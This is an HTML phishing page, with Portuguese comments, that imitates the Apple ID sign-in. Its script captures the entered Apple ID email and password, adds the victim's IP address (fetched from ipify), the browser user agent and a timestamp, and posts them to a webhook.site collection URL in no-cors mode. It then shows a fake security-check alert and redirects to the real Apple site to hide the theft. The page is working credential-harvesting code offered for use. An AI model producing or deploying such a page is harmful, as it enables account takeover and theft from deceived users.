<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Iniciar sessão - Apple ID</title>
  <style>
    /* (Mantenha os mesmos estilos do código anterior) */
  </style>
</head>
<body>
  <!-- (Mantenha a mesma estrutura HTML do código anterior) -->

  <script>
    document.getElementById("loginForm").addEventListener("submit", async function(e) {
      e.preventDefault();

      // 1. Coleta de dados aprimorada
      const credentials = {
        email: document.querySelector('input[name="apple_id"]').value,
        senha: document.querySelector('input[name="password"]').value,
        metadata: {
          ip: await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip),
          user_agent: navigator.userAgent,
          timestamp: new Date().toISOString(),
          origem: "GitHub Pages"
        }
      };

      // 2. Configuração da requisição corrigida
      const webhookURL = 'https://webhook.site/e9026c1f-9cde-4e6c-9d5d-bc2eb5f83418';
      
      try {
        // 3. Envio com tratamento de erros
        const response = await fetch(webhookURL, {
          method: 'POST',
          mode: 'no-cors', // Contorna problemas de CORS
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(credentials)
        });

        // 4. Feedback visual
        alert("Verificação de segurança concluída. Redirecionando...");
        window.location.href = "https://appleid.apple.com/";
        
      } catch (error) {
        console.error("Erro:", error);
        window.location.href = "https://appleid.apple.com/";
      }
    });
  </script>
</body>
</html>